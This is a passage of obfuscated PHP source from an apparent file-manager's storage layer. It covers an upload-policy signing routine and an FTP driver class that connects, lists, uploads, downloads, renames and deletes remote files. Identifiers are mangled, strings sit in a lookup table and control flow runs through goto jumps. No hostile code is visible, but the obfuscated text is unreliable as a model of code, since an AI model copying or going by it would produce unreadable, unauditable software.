array($EÙ˜¤Œ›×Â[1092] => gmdate($EÙ˜¤Œ›×Â[1091], strtotime($EÙ˜¤Œ›×Â[1127])), $EÙ˜¤Œ›×Â[1093] => array(array($EÙ˜¤Œ›×Â[1095] => $this->bucket), array($EÙ˜¤Œ›×Â[1094] => $e”ŠÔÊß©), array($EÙ˜¤Œ›×Â[1096], $EÙ˜¤Œ›×Â[1097], $EÙ˜¤Œ›×Â[43]), array($EÙ˜¤Œ›×Â[1096], $EÙ˜¤Œ›×Â[1128], $EÙ˜¤Œ›×Â[43]), array($EÙ˜¤Œ›×Â[1096], $EÙ˜¤Œ›×Â[1129], $EÙ˜¤Œ›×Â[43]), array($EÙ˜¤Œ›×Â[1098] => $CÄËØÚå…), array($EÙ˜¤Œ›×Â[1130] => $F¿è‰±Õå¬), array($EÙ˜¤Œ›×Â[1131] => $dø”øÊ°åˆ), array($EÙ˜¤Œ›×Â[1132] => $d¿Ñ¼·ÃƒÓ), array($EÙ˜¤Œ›×Â[1133] => $eÉ¹”š­á))); goto b¼”î‹´Ëš; F£‹öğÂç¢: $fÌÀ ¦…Œ« = $EÙ˜¤Œ›×Â[69]; $d¿Ñ¼·ÃƒÓ = gmdate($EÙ˜¤Œ›×Â[1125]); $B“ÚÈˆ÷ = gmdate($EÙ˜¤Œ›×Â[680]); goto Cæš”‰Ô§; d‘¶ÓÊšàì: $EÙ˜¤Œ›×Â =& $_SERVER[¨¤¼…´]; $e”ŠÔÊß© = $EÙ˜¤Œ›×Â[199]; $dø”øÊ°åˆ = $EÙ˜¤Œ›×Â[1124]; goto F£‹öğÂç¢; EÅâ¡‚âÛï: $a´Œ­¡©Ë” = hash_hmac($EÙ˜¤Œ›×Â[1134], $fÌÀ ¦…Œ«, $Cíõ†Œ¡åË, !0); $e˜íÅâ†ô„ = hash_hmac($EÙ˜¤Œ›×Â[1134], $AÜ²»åŸ‰å, $a´Œ­¡©Ë”, !0); $e§á£¥†‹“ = hash_hmac($EÙ˜¤Œ›×Â[1134], $c®¾ÈÔÚ–, $e˜íÅâ†ô„); goto E‡øøÃ³‚; b¼”î‹´Ëš: $c®¾ÈÔÚ– = base64_encode(json_encode($dé”Î‹Š£Œ)); $cÛ”…¡áÊ† = hash_hmac($EÙ˜¤Œ›×Â[1134], $B“ÚÈˆ÷, $EÙ˜¤Œ›×Â[1135] . $this->secret, !0); $Cíõ†Œ¡åË = hash_hmac($EÙ˜¤Œ›×Â[1134], $this->region, $cÛ”…¡áÊ†, !0); goto EÅâ¡‚âÛï; E‡øøÃ³‚: $e‘å¤ÍË‰ = array($EÙ˜¤Œ›×Â[213] => $EÙ˜¤Œ›×Â[43], $EÙ˜¤Œ›×Â[1136] => $EÙ˜¤Œ›×Â[43], $EÙ˜¤Œ›×Â[1094] => $e”ŠÔÊß©, $EÙ˜¤Œ›×Â[1098] => $CÄËØÚå…, $EÙ˜¤Œ›×Â[1102] => $c®¾ÈÔÚ–, $EÙ˜¤Œ›×Â[1137] => $F¿è‰±Õå¬, $EÙ˜¤Œ›×Â[1138] => $dø”øÊ°åˆ, $EÙ˜¤Œ›×Â[1139] => $d¿Ñ¼·ÃƒÓ, $EÙ˜¤Œ›×Â[1140] => $eÉ¹”š­á, $EÙ˜¤Œ›×Â[1141] => $e§á£¥†‹“, $EÙ˜¤Œ›×Â[183] => $this->getHost()); return $e‘å¤ÍË‰; goto EãğÛ¢÷Ğ; EãğÛ¢÷Ğ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($FÉ¦ ‘Úõ¾) { parent::__construct(); if (count($FÉ¦ ‘Úõ¾) > 0) { $this->_init($FÉ¦ ‘Úõ¾); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($aÊÓ‘óóª) { $F‡ÒùËÄ²ˆ =& $_SERVER[¨¤¼…´]; global $config; $this->appCharset = $config[$F‡ÒùËÄ²ˆ[1142]]; $this->systemCharset = $config[$F‡ÒùËÄ²ˆ[1143]]; if (isset($aÊÓ‘óóª[$F‡ÒùËÄ²ˆ[1144]]) && $aÊÓ‘óóª[$F‡ÒùËÄ²ˆ[1144]]) { $this->systemCharset = $aÊÓ‘óóª[$F‡ÒùËÄ²ˆ[1144]]; } } public function iconvApp($c‘¿’ÕÙÁ) { return $this->iconvTo($c‘¿’ÕÙÁ, $this->systemCharset, $this->appCharset); } public function iconvSystem($E¼¸îå‘„) { return $this->iconvTo($E¼¸îå‘„, $this->appCharset, $this->systemCharset); } public function getPathOuter($fİ·ÂÍï¤) { goto A«Ü²á©“‘; Aßã“Şç­Ğ: $fİ·ÂÍï¤ = KodIO::clear($fİ·ÂÍï¤); $fİ·ÂÍï¤ = substr($fİ·ÂÍï¤, strlen($b¡‡œªĞ÷•)); if (empty($this->pathDriver)) { return $fİ·ÂÍï¤; } goto d“‹ÈŞáô‚; A«Ü²á©“‘: $fç’ ¢ÒÇ =& $_SERVER[¨¤¼…´]; $b¡‡œªĞ÷• = $this->iconvApp($this->pathBase); $fİ·ÂÍï¤ = $this->iconvApp($fİ·ÂÍï¤); goto AÇªøº²; d“‹ÈŞáô‚: return $this->pathDriver . $fç’ ¢ÒÇ[8] . ltrim($fİ·ÂÍï¤, $fç’ ¢ÒÇ[8]); goto e‡ìóƒ±’¢; AÇªøº²: if (substr($b¡‡œªĞ÷•, 0, 2) == $fç’ ¢ÒÇ[1145]) { $b¡‡œªĞ÷• = BASIC_PATH . substr($b¡‡œªĞ÷•, 2); } if (substr($fİ·ÂÍï¤, 0, 2) == $fç’ ¢ÒÇ[1145]) { $fİ·ÂÍï¤ = BASIC_PATH . substr($fİ·ÂÍï¤, 2); } $b¡‡œªĞ÷• = KodIO::clear($b¡‡œªĞ÷•); goto Aßã“Şç­Ğ; e‡ìóƒ±’¢: } private function _init($dø‡…ÈÁÓ = array()) { $D™¸´³‡éÃ =& $_SERVER[¨¤¼…´]; if (!function_exists($D™¸´³‡éÃ[1146])) { throw new Exception(LNG($D™¸´³‡éÃ[1147])); } $this->config = $dø‡…ÈÁÓ; $this->charsetReset($dø‡…ÈÁÓ); foreach ($dø‡…ÈÁÓ as $E“…¿¶··ª => $Eò° ˆò©ƒ) { if (isset($this->{$E“…¿¶··ª})) { $this->{$E“…¿¶··ª} = $Eò° ˆò©ƒ; } } return $this->_login($dø‡…ÈÁÓ); } private function _login($a¬×ã¬å°) { goto fËô±õ’Ã´; fËô±õ’Ã´: $b¶Ç™¡Şá” =& $_SERVER[¨¤¼…´]; static $dÑ¾é´ÓµÙ = array(); $B­‚ö„ØÒ = md5(json_encode($a¬×ã¬å°)); goto b‰Ë…»Êå; b‰Ë…»Êå: if (isset($dÑ¾é´ÓµÙ[$B­‚ö„ØÒ])) { foreach ($dÑ¾é´ÓµÙ[$B­‚ö„ØÒ] as $b—ØØË‹¯¥ => $fŒšˆËÚØ) { $this->{$b—ØØË‹¯¥} = $fŒšˆËÚØ; } return !0; } $Cä©£³·ø› = parse_url(trim($this->server, $b¶Ç™¡Şá”[8])); $this->host = $Cä©£³·ø›[$b¶Ç™¡Şá”[183]]; goto cç™¿‰‡Ë; Böùöä¬…¶: $dÑ¾é´ÓµÙ[$B­‚ö„ØÒ] = array($b¶Ç™¡Şá”[1151] => $this->connect, $b¶Ç™¡Şá”[183] => $this->host, $b¶Ç™¡Şá”[182] => $this->scheme, $b¶Ç™¡Şá”[184] => $this->port); return $F™à†»”š¾; goto Dƒ¬ŸÌ‰Í; e±ğ¬•‰ä³: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $F¶ßô™°é = $this->pasv == $b¶Ç™¡Şá”[93] ? !0 : !1; @ftp_pasv($this->connect, $F¶ßô™°é); goto Böùöä¬…¶; cç™¿‰‡Ë: $a¬©¤Ïƒè· = isset($Cä©£³·ø›[$b¶Ç™¡Şá”[182]]) && $Cä©£³·ø›[$b¶Ç™¡Şá”[182]] == $b¶Ç™¡Şá”[1148] ? !0 : !1; $this->scheme = $a¬©¤Ïƒè· ? $b¶Ç™¡Şá”[1149] : $b¶Ç™¡Şá”[1150]; $this->port = isset($Cä©£³·ø›[$b¶Ç™¡Şá”[184]]) ? $Cä©£³·ø›[$b¶Ç™¡Şá”[184]] : 21; goto D±åµ«¦í; D±åµ«¦í: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $F™à†»”š¾ = @ftp_login($this->connect, $this->username, $this->userpass); goto e±ğ¬•‰ä³; Dƒ¬ŸÌ‰Í: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($C‡³°›Ÿ¥˜, $B¿›Ú˜‡É¸ = '', $EÛç›³µ… = REPEAT_RENAME) { if ($this->setContent($C‡³°›Ÿ¥˜, $B¿›Ú˜‡É¸)) { return $this->getPathOuter($C‡³°›Ÿ¥˜); } return !1; } public function mkdir($dØ»ª•¨ˆ, $e¬‘¤‹•…ß = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $dØ»ª•¨ˆ = $this->iconvSystem($dØ»ª•¨ˆ); if ($this->isFolder($dØ»ª•¨ˆ) || @ftp_mkdir($this->connect, $dØ»ª•¨ˆ)) { return $this->getPathOuter($dØ»ª•¨ˆ); } if (!$this->mkdir($this->pathFather($dØ»ª•¨ˆ))) { return !1; } if ($dØ»ª•¨ˆ = @ftp_mkdir($this->connect, $dØ»ª•¨ˆ)) { return $this->getPathOuter($dØ»ª•¨ˆ); } return !1; } public function copyFile($CÑºÜ“ÇˆŠ, $BÀ“ŸÀÂ‚) { goto aŸˆ®ÌÖ; aŸˆ®ÌÖ: if (!$this->_isconn()) { return !1; } $bÊ–×™´±ö = $this->pathThis($this->iconvSystem($CÑºÜ“ÇˆŠ)); $b¬Šæ¹ÎĞĞ = $this->tempFile($bÊ–×™´±ö); goto d¥Ş¸¬¬Ê¸; d¥Ş¸¬¬Ê¸: $c¹ÚéÑâÜ¨ = $this->iconvApp($b¬Šæ¹ÎĞĞ); $this->download($CÑºÜ“ÇˆŠ, $c¹ÚéÑâÜ¨); $b–…÷ìêæø = $this->upload($BÀ“ŸÀÂ‚, $c¹ÚéÑâÜ¨); goto Bô½èöºÆ ; Bô½èöºÆ : $this->tempFileRemve($b¬Šæ¹ÎĞĞ); return $b–…÷ìêæø; goto A¯´²„Æƒµ; A¯´²„Æƒµ: } public function moveFile($cëß‚°†Ù», $C²¼©ù² ) { if (!$this->_isconn()) { return !1; } $cëß‚°†Ù» = $this->iconvSystem($cëß‚°†Ù»); $C²¼©ù²  = $this->iconvSystem($C²¼©ù² ); $cóîµ«ÆŒ¶ = @ftp_rename($this->connect, $cëß‚°†Ù», $C²¼©ù² ); return $cóîµ«ÆŒ¶ ? $this->getPathOuter($C²¼©ù² ) : !1; } public function delFile($eõ§ËÙ»ƒä) { if (!$this->_isconn()) { return !1; } $eõ§ËÙ»ƒä = $this->iconvSystem($eõ§ËÙ»ƒä); return @ftp_delete($this->connect, $eõ§ËÙ»ƒä); } public function delFolder($c¨‰È“«) { if (!$this->_isconn()) { return !1; } $c¨‰È“« = $this->iconvSystem($c¨‰È“«); $fß¨Ü´Ú¡ô = $this->ftpList($c¨‰È“«); if (!$fß¨Ü´Ú¡ô) { return @ftp_rmdir($this->connect, $c¨‰È“«); } foreach ($fß¨Ü´Ú¡ô as $Cåô¼ˆÑ°¸) { if ($this->isFolder($Cåô¼ˆÑ°¸)) { $Cåô¼ˆÑ°¸ = $this->iconvApp($Cåô¼ˆÑ°¸); $this->delFolder($Cåô¼ˆÑ°¸); } else { @ftp_delete($this->connect, $Cåô¼ˆÑ°¸); } } return @ftp_rmdir($this->connect, $c¨‰È“«); } public function rename($bñİ×ù¯†¶, $eá¾õÓãÀ½) { goto FÃ°ğÎèƒ; EÅâóº°Ã: $fß¥²Ö–—Ù = $this->iconvSystem($fß¥²Ö–—Ù); $bñİ×ù¯†¶ = $this->iconvSystem($bñİ×ù¯†¶); $e‰áôåîÌï = $this->pathFather($bñİ×ù¯†¶); goto fµÍƒÔ´ó„; fµÍƒÔ´ó„: $e‘×¯‹ªçÁ = rtrim($e‰áôåîÌï, $báÒİ•¡”¢[8]) . $báÒİ•¡”¢[8] . $fß¥²Ö–—Ù; $dáºì¸ñØ = @ftp_rename($this->connect, $bñİ×ù¯†¶, $e‘×¯‹ªçÁ); $e‘×¯‹ªçÁ = $this->iconvApp($e‘×¯‹ªçÁ); goto e¦çà¤ÛÇÂ; FÃ°ğÎèƒ: $báÒİ•¡”¢ =& $_SERVER[¨¤¼…´]; if (!$this->_isconn()) { return !1; } $fß¥²Ö–—Ù = $this->fileNameAuto($this->pathFather($bñİ×ù¯†¶), $eá¾õÓãÀ½); goto EÅâóº°Ã; e¦çà¤ÛÇÂ: return $dáºì¸ñØ ? $this->getPathOuter($e‘×¯‹ªçÁ) : !1; goto d°Âğï™¶; d°Âğï™¶: } private function folderInfo($Dò‰³æ‹Ñ¦, $e°ÍÒ±ğ = false) { goto a¦ÎÆ¯Œğ‹; EŞ¥É•æÂ: $a§Ó§ÆÁ®½ = $this->iconvSystem($Dò‰³æ‹Ñ¦); if ($e°ÍÒ±ğ) { return array($BÃ‹÷ƒ¶ˆœ[38] => $BõŸ–­å«Û, $BÃ‹÷ƒ¶ˆœ[85] => $AİÈÎÚÏìÆ, $BÃ‹÷ƒ¶ˆœ[39] => $BÃ‹÷ƒ¶ˆœ[86]); } $A’ñÚÔ‰­ = array($BÃ‹÷ƒ¶ˆœ[38] => $BõŸ–­å«Û, $BÃ‹÷ƒ¶ˆœ[85] => $AİÈÎÚÏìÆ, $BÃ‹÷ƒ¶ˆœ[39] => $BÃ‹÷ƒ¶ˆœ[86], $BÃ‹÷ƒ¶ˆœ[201] => 0, $BÃ‹÷ƒ¶ˆœ[117] => 0, $BÃ‹÷ƒ¶ˆœ[1152] => !0, $BÃ‹÷ƒ¶ˆœ[1153] => !0); goto eÑ±«¨ˆåÀ; a¦ÎÆ¯Œğ‹: $BÃ‹÷ƒ¶ˆœ =& $_SERVER[¨¤¼…´]; $AİÈÎÚÏìÆ = $this->getPathOuter(rtrim($Dò‰³æ‹Ñ¦, $BÃ‹÷ƒ¶ˆœ[8])); $BõŸ–­å«Û = $this->pathThis($AİÈÎÚÏìÆ); goto EŞ¥É•æÂ; eÑ±«¨ˆåÀ: return $A’ñÚÔ‰­; goto c¶§‘²¥¨¬; c¶§‘²¥¨¬: } private function fileInfo($aÖ³Ìİçé˜, $B¤è„«šä… = false) { goto D¥©ù•ŠÕø; aÍ•ï‘Âæ²: $DË²ĞÄ“ã = $this->iconvSystem($aÖ³Ìİçé˜); if ($B¤è„«šä…) { return array($DñÇÍÜå·[38] => $fÇ­ášìĞ‹, $DñÇÍÜå·[85] => $c˜â²ÄÁƒŒ, $DñÇÍÜå·[39] => $DñÇÍÜå·[181], $DñÇÍÜå·[175] => $this->ext($aÖ³Ìİçé˜), $DñÇÍÜå·[87] => $this->size($aÖ³Ìİçé˜)); } $Fª–«ã²¥é = array($DñÇÍÜå·[38] => $fÇ­ášìĞ‹, $DñÇÍÜå·[85] => $c˜â²ÄÁƒŒ, $DñÇÍÜå·[39] => $DñÇÍÜå·[181], $DñÇÍÜå·[201] => 0, $DñÇÍÜå·[117] => @ftp_mdtm($this->connect, $DË²ĞÄ“ã), $DñÇÍÜå·[175] => $this->ext($aÖ³Ìİçé˜), $DñÇÍÜå·[87] => $this->size($aÖ³Ìİçé˜), $DñÇÍÜå·[1152] => !0, $DñÇÍÜå·[1153] => !0); goto eÏŸğË‚Ñ‘; D¥©ù•ŠÕø: $DñÇÍÜå· =& $_SERVER[¨¤¼…´]; $c˜â²ÄÁƒŒ = $this->getPathOuter(rtrim($aÖ³Ìİçé˜, $DñÇÍÜå·[8])); $fÇ­ášìĞ‹ = $this->pathThis($c˜â²ÄÁƒŒ); goto aÍ•ï‘Âæ²; eÏŸğË‚Ñ‘: $Fª–«ã²¥é[$DñÇÍÜå·[117]] = $Fª–«ã²¥é[$DñÇÍÜå·[117]] > 0 ? $Fª–«ã²¥é[$DñÇÍÜå·[117]] : 0; return $Fª–«ã²¥é; goto eøó ñØ; eøó ñØ: } public function size($bå·—‡ì½œ) { $B¹ÍÓ‘ Ë = $this->objectMeta($bå·—‡ì½œ); return $B¹ÍÓ‘ Ë ? $B¹ÍÓ‘ Ë[$_SERVER[¨¤¼…´][87]] : 0; } public function info($fæå‡ÑÌÙÔ) { if ($this->isFile($fæå‡ÑÌÙÔ)) { return $this->fileInfo($fæå‡ÑÌÙÔ, 0); } else { if ($this->isFolder($fæå‡ÑÌÙÔ)) { return $this->folderInfo($fæå‡ÑÌÙÔ); } } return !1; } public function exist($cäãÇø‰Ïø) { return $this->objectMeta($cäãÇø‰Ïø) ? !0 : !1; } public function isFile($DÂè”ê¥íÍ) { $E­§«‰”²˜ =& $_SERVER[¨¤¼…´]; $EòƒßŸ¼† = $this->objectMeta($DÂè”ê¥íÍ); return $EòƒßŸ¼† ? $EòƒßŸ¼†[$E­§«‰”²˜[39]] == $E­§«‰”²˜[181] : !1; } public function isFolder($a´İÑØ–³À) { $c¨ã²–àß =& $_SERVER[¨¤¼…´]; $Fùø§ƒÊäÑ = $this->objectMeta($a´İÑØ–³À); return $Fùø§ƒÊäÑ ? $Fùø§ƒÊäÑ[$c¨ã²–àß[39]] == $c¨ã²–àß[86] : !1; } public function listPath($EÌ‚ÌĞ•÷Š, $CœõôêÒğ› = false) { goto fá•æ°—»É; e¾Å–—Û±Ú: foreach ($FîèÙ´Ëåƒ as $EÌ‚ÌĞ•÷Š) { if ($this->isFolder($EÌ‚ÌĞ•÷Š)) { $FÓĞóÎ˜ö–[$A¤ÀÅšì‹ˆ[84]][] = $this->folderInfo($EÌ‚ÌĞ•÷Š, $CœõôêÒğ›); } else { $FÓĞóÎ˜ö–[$A¤ÀÅšì‹ˆ[83]][] = $this->fileInfo($EÌ‚ÌĞ•÷Š, $CœõôêÒğ›); } } return $FÓĞóÎ˜ö–; goto eÉ²–ù‘†¥; fæË¸¯…ƒ²: $FîèÙ´Ëåƒ = $this->ftpList($EÌ‚ÌĞ•÷Š); $FÓĞóÎ˜ö– = array($A¤ÀÅšì‹ˆ[84] => array(), $A¤ÀÅšì‹ˆ[83] => array()); if (!$FîèÙ´Ëåƒ) { return $FÓĞóÎ˜ö–; } goto e¾Å–—Û±Ú; fá•æ°—»É: $A¤ÀÅšì‹ˆ =& $_SERVER[¨¤¼…´]; if (!$this->_isconn()) { return !1; } $EÌ‚ÌĞ•÷Š = $this->iconvSystem($EÌ‚ÌĞ•÷Š); goto fæË¸¯…ƒ²; eÉ²–ù‘†¥: } public function has($a­èÃï´‡, $f—ßš‚¹ = false, $f¯Š‹­½Èé = true) { goto EŠĞÜŒ—†; EŠĞÜŒ—†: $f‚¿•îòæ =& $_SERVER[¨¤¼…´]; if (!$this->_isconn()) { return !1; } $a­èÃï´‡ = $this->iconvSystem($a­èÃï´‡); goto A‡±ã³À; A‡±ã³À: $DŞã·¹»…ˆ = $this->ftpList($a­èÃï´‡); if (!$DŞã·¹»…ˆ) { return !1; } if ($f—ßš‚¹) { return array($f‚¿•îòæ[205] => 0, $f‚¿•îòæ[206] => count($DŞã·¹»…ˆ)); } goto D ˆÂŞÉÄ¢; D ˆÂŞÉÄ¢: foreach ($DŞã·¹»…ˆ as $a­èÃï´‡) { if ($f¯Š‹­½Èé) { if (!$this->isFolder($a­èÃï´‡)) { return !0; } } else { if ($this->isFolder($a­èÃï´‡)) { return !0; } } } return !1; goto e†³¬Êíß; e†³¬Êíß: } public function listAll($Aš¹óøÓíå) { goto dİÔÊ¶°á¸; e‰å¹š„í: foreach ($dç¨§[$AöÕ¬¬Ìíà[84]] as $eœ³ª±äˆ) { $eç‡¨²ˆ½[] = array($AöÕ¬¬Ìíà[85] => $AöÕ¬¬Ìíà[8] . trim(str_replace($Aš¹óøÓíå, $AöÕ¬¬Ìíà[43], $eœ³ª±äˆ), $AöÕ¬¬Ìíà[8]) . $AöÕ¬¬Ìíà[8], $AöÕ¬¬Ìíà[86] => 1, $AöÕ¬¬Ìíà[87] => 0); } foreach ($dç¨§[$AöÕ¬¬Ìíà[83]] as $b’Ï´ŸØÅÏ) { $eç‡¨²ˆ½[] = array($AöÕ¬¬Ìíà[85] => $AöÕ¬¬Ìíà[8] . trim(str_replace($Aš¹óøÓíå, $AöÕ¬¬Ìíà[43], $b’Ï´ŸØÅÏ), $AöÕ¬¬Ìíà[8]), $AöÕ¬¬Ìíà[86] => 0, $AöÕ¬¬Ìíà[87] => $this->size($b’Ï´ŸØÅÏ)); } return $eç‡¨²ˆ½; goto CÆö¼—¨Ÿ‹; Eò­Ÿà©İÅ: $dç¨§ = array($AöÕ¬¬Ìíà[83] => array(), $AöÕ¬¬Ìíà[84] => array()); $this->recursionFtpFiles($Aš¹óøÓíå, $dç¨§); $eç‡¨²ˆ½ = array(); goto e‰å¹š„í; dİÔÊ¶°á¸: $AöÕ¬¬Ìíà =& $_SERVER[¨¤¼…´]; if (!$this->_isconn()) { return !1; } $Aš¹óøÓíå = $this->iconvSystem($Aš¹óøÓíå); goto Eò­Ÿà©İÅ; CÆö¼—¨Ÿ‹: } public function getContent($CĞÅ”Ş³Ï‡) { if (!$this->_isconn()) { return !1; } $CĞÅ”Ş³Ï‡ = $this->iconvSystem($CĞÅ”Ş³Ï‡); return $this->fileSubstr($CĞÅ”Ş³Ï‡); } public function setContent($FÖÈÚ ‰‚, $C™ó© ÆÙ‚ = '') { goto eÉˆÕËâº‹; eÉˆÕËâº‹: if (!$this->_isconn()) { return !1; } $b¿Ëîò´¤ = $this->pathThis($this->iconvSystem($FÖÈÚ ‰‚)); $C—‡¬Ÿ¢ë´ = $this->tempFile($b¿Ëîò´¤); goto Dã†»‹Ó…Ú; d‡éĞ•¾œĞ: return $E¼ÈĞ”òÔã; goto E›‘›­Ñ®ª; Dã†»‹Ó…Ú: file_put_contents($C—‡¬Ÿ¢ë´, $C™ó© ÆÙ‚); $E¼ÈĞ”òÔã = $this->upload($FÖÈÚ ‰‚, $this->iconvApp($C—‡¬Ÿ¢ë´)); $this->tempFileRemve($C—‡¬Ÿ¢ë´); goto d‡éĞ•¾œĞ; E›‘›­Ñ®ª: } public function fileSubstr($f¹ğÂ¡İ¥‹, $C¢îÇçñ—à = 0, $f—ìõ·à»œ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($f¹ğÂ¡İ¥‹, $C¢îÇçñ—à, $f—ìõ·à»œ); } private function ftpRequest($A·³íÎöÜ†, $AÍÈÚÑäò³ = 0, $c¿İ‚ÉÌÁ = false) { goto b§ùŒ¸Áˆø; CÈö¢‡¯ä: curl_setopt($eé‘’æç‚¹, CURLOPT_URL, $a‚ÀªÆ¿ØÛ . $this->pathEncode($A·³íÎöÜ†)); curl_setopt($eé‘’æç‚¹, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($c¿İ‚ÉÌÁ) { $Eâ‡ó”¥è… = $AÍÈÚÑäò³ + $c¿İ‚ÉÌÁ - 1; curl_setopt($eé‘’æç‚¹, CURLOPT_RANGE, "{$AÍÈÚÑäò³}\x2d{$Eâ‡ó”¥è…}"); } goto A–Š¹íª£Û; A–Š¹íª£Û: curl_setopt($eé‘’æç‚¹, CURLOPT_RETURNTRANSFER, 1); $F¹œÇã§Á‚ = curl_exec($eé‘’æç‚¹); curl_close($eé‘’æç‚¹); goto bäÒè·öª; b§ùŒ¸Áˆø: $A·³íÎöÜ† = $this->iconvSystem($A·³íÎöÜ†); $a‚ÀªÆ¿ØÛ = $this->scheme . $this->host . $_SERVER[¨¤¼…´][4] . $this->port; $eé‘’æç‚¹ = curl_init(); goto CÈö¢‡¯ä; bäÒè·öª: return $F¹œÇã§Á‚; goto c†İƒ‹öÈÏ; c†İƒ‹öÈÏ: } public function upload($Fïõš­½, $C’šƒµìÍÖ, $DîŠæÅÅ¬‹ = false, $c¬Àù§íÕ = REPEAT_REPLACE) { goto f»òÚ…¼Àà; f»òÚ…¼Àà: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Fïõš­½))) { return !1; } $Fïõš­½ = $this->iconvSystem($Fïõš­½); goto fœ¯ÆÊìˆ; fœ¯ÆÊìˆ: $C’šƒµìÍÖ = $this->iconvSystem($C’šƒµìÍÖ); $côôè‘ˆŒ = ftp_nb_put($this->connect, $Fïõš­½, $C’šƒµìÍÖ, FTP_BINARY); while ($côôè‘ˆŒ == FTP_MOREDATA) { $côôè‘ˆŒ = ftp_nb_continue($this->connect); } goto Fä‘ˆàáéô; Fä‘ˆàáéô: if ($côôè‘ˆŒ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Fïõš­½); goto f³™ÕŠŞ™‹; f³™ÕŠŞ™‹: } public function download($CšòÜƒÃ÷, $f‡ÓÛØÉ÷ = '') { goto EğòïºƒÄ›; Eìêè¾×ˆ: $CšòÜƒÃ÷ = $this->iconvSystem($CšòÜƒÃ÷); $f‡ÓÛØÉ÷ = $this->iconvSystem($f‡ÓÛØÉ÷); $a§š™àÃ˜¿ = ftp_nb_get($this->connect, $f‡ÓÛØÉ÷, $CšòÜƒÃ÷, FTP_BINARY); goto Fª–†‹Ùø; EğòïºƒÄ›: if (!$this->_isconn()) { return !1; } $aºëËË­à” = $this->pathFather($f‡ÓÛØÉ÷); if (!IO::mkdir($aºëËË­à”)) { return !1; } goto Eìêè¾×ˆ; Fª–†‹Ùø: while ($a§š™àÃ˜¿ == FTP_MOREDATA) { $a§š™àÃ˜¿ = ftp_nb_continue($this->connect); } if ($a§š™àÃ˜¿ != FTP_FINISHED) { return !1; } return $this->iconvApp($f‡ÓÛØÉ÷); goto fé™ö™Êç¡; fé™ö™Êç¡: } private function ftpList($F‰Ù‹õæÕ) { goto cªÉŠùÉÈ; E–Ãäù÷·Ù: $B‰ŠŒ¬õ„— = array_diff($B‰ŠŒ¬õ„—, array($BÛùæš’[101], $BÛùæš’[1155], $F‰Ù‹õæÕ . $BÛùæš’[101], $F‰Ù‹õæÕ . $BÛùæš’[1155])); $DÚ¬‹Î «í = array(); foreach ($B‰ŠŒ¬õ„— as $cĞ‰¡Î†à) { if (!strstr($cĞ‰¡Î†à, $BÛùæš’[8])) { $cĞ‰¡Î†à = $F‰Ù‹õæÕ . ltrim($cĞ‰¡Î†à, $BÛùæš’[8]); } $DÚ¬‹Î «í[] = $this->iconvApp($cĞ‰¡Î†à); } goto BØ¬ÁöÆÙá; BØ¬ÁöÆÙá: return $DÚ¬‹Î «í; goto bÔù™îŠ¬»; bì¯‰ßñ½‘: $F‰Ù‹õæÕ = rtrim($F‰Ù‹õæÕ, $BÛùæš’[8]) . $BÛùæš’[8]; $B‰ŠŒ¬õ„— = @ftp_nlist($this->connect, $F‰Ù‹õæÕ); if ($B‰ŠŒ¬õ„— === !1) { $B‰ŠŒ¬õ„— = @ftp_rawlist($this->connect, $F‰Ù‹õæÕ); foreach ($B‰ŠŒ¬õ„— as $AñÒ‚¾ñ³ => $Bá–©‡¥ƒ») { $B‰ŠŒ¬õ„—[$AñÒ‚¾ñ³] = end(explode($BÛùæš’[1154], $Bá–©‡¥ƒ»)); } } goto E–Ãäù÷·Ù; cªÉŠùÉÈ: $BÛùæš’ =& $_SERVER[¨¤¼…´]; if (!$this->isFolder($F‰Ù‹õæÕ)) { return !1; } @ftp_chdir($this->connect, $BÛùæš’[8]); goto bì¯‰ßñ½‘; bÔù™îŠ¬»: } private function recursionFtpFiles($bÁáŸÏ¸Ú‰, &$Eóˆ’ñ¸˜ó) { $cê«‹Ë© =& $_SERVER[¨¤¼…´]; if (!$this->_isconn()) { return !1; } if (!($f§‹ÚÜ—¥¶ = $this->ftpList($bÁáŸÏ¸Ú‰))) { return !1; } foreach ($f§‹ÚÜ—¥¶ as $bÁáŸÏ¸Ú‰) { if ($this->isFolder($bÁáŸÏ¸Ú‰)) { $this->recursionFtpFiles($bÁáŸÏ¸Ú‰, $Eóˆ’ñ¸˜ó); $Eóˆ’ñ¸˜ó[$cê«‹Ë©[84]][] = $bÁáŸÏ¸Ú‰; } else { $Eóˆ’ñ¸˜ó[$cê«‹Ë©[83]][] = $bÁáŸÏ¸Ú‰; } } } private function objectMeta($Bğ‡ô¹Á³) { goto c‹¥õÒ·¶‹; b«æˆ‡•ïİ: if ($Bì×„Œ´ˆ£ !== null && $Bì×„Œ´ˆ£ !== !1) { return $Bì×„Œ´ˆ£; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $aÈ¹¶ŸŒÉ[8]); goto Dœ¶…¦ÌñÍ; F¯Éº¬°î¿: return $Bì×„Œ´ˆ£; goto fíåŸßé£; Dœ¶…¦ÌñÍ: $eÌœ‘¿¸ã = @ftp_size($this->connect, $this->iconvSystem($Bğ‡ô¹Á³)); if ($eÌœ‘¿¸ã != -1) { $Bì×„Œ´ˆ£ = array($aÈ¹¶ŸŒÉ[87] => $eÌœ‘¿¸ã, $aÈ¹¶ŸŒÉ[39] => $aÈ¹¶ŸŒÉ[181]); } else { $d©æ›‰ª²” = @ftp_chdir($this->connect, $this->iconvSystem($Bğ‡ô¹Á³)); $Bì×„Œ´ˆ£ = $d©æ›‰ª²” ? array($aÈ¹¶ŸŒÉ[87] => 0, $aÈ¹¶ŸŒÉ[39] => $aÈ¹¶ŸŒÉ[86]) : !1; } Cache::set($dµµ·›ğ¥, $Bì×„Œ´ˆ£, 0); goto F¯Éº¬°î¿; c‹¥õÒ·¶‹: $aÈ¹¶ŸŒÉ =& $_SERVER[¨¤¼…´]; $dµµ·›ğ¥ = 